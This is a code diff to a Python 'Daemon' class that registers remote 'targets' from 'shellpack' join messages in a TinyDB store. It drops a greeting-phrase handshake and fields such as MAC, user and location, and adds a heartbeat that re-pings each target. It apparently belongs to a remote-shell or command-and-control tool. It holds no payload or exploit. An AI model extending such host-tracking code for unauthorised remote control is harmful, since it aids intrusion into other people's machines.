@@ -19,26 +19,19 @@ class Daemon(Host):
         self.db = TinyDB('./db.json')
 
     def join(self, shellpack):
-        match shellpack['message']:
-            case "hello how are you":
-                
-                target = {
-                    "id": round(time.time()),
-                    "ip": shellpack['ip'],
-                    "iface": shellpack['iface'],
-                    "mac": shellpack['mac'],
-                    "user": shellpack['user'],
-                    "location": shellpack['location'],
-                    "status": "STANDBY"
-                    }
+        target = {
+            "id": round(time.time()),
+            "ip": shellpack['ip'],
+            "status": "CONNECTED"
+            }
 
-                self.db.insert(target)
-                self.send(target['ip'], "join", "fine thank you")
-                
-                self.db.update({'status': 'CONNECTED'}, Query().id == target['id'])
-            case _:
-                print("Invalid join message")
-        return
+        self.db.insert(target)
+
+    def heartbeat(self):
+        for target in self.db.all():
+            Target = Query()
+            self.db.update({'status': 'DISCONNECTED'}, Target.id == target['id'])
+            self.send(target['ip'], "join")
         
 if __name__ == "__main__":
 
